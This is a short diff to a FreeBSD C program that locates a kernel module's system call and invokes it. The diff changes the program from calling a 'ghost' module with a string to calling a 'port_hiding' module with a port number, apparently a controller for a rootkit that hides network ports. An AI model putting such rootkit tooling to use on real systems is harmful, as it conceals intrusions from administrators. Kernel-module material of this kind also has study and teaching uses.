@@ -9,13 +9,15 @@ int main(int argc, char* argv[]) {
     int syscall_num, modid, result;
     struct module_stat stat;
     if (argc != 2) {
-        printf("Usage: %s <string>\n", argv[0]);
+        printf("Usage: %s <port>\n", argv[0]);
         exit(0);
     }
 
-    /* Determine ghost offset value */
+    uint16_t port = strtol(argv[1], NULL, 10);
+
+    /* Determine port-hiding offset value */
     stat.version = sizeof(stat);
-    modid = modfind("sys/ghost");
+    modid = modfind("sys/port_hiding");
     if (modid == -1) {
         perror("modfind");
         exit(1);
@@ -28,5 +30,5 @@ int main(int argc, char* argv[]) {
     }
     syscall_num = stat.data.intval;
 
-    return(syscall(syscall_num, argv[1]));
+    return(syscall(syscall_num, port));
 }
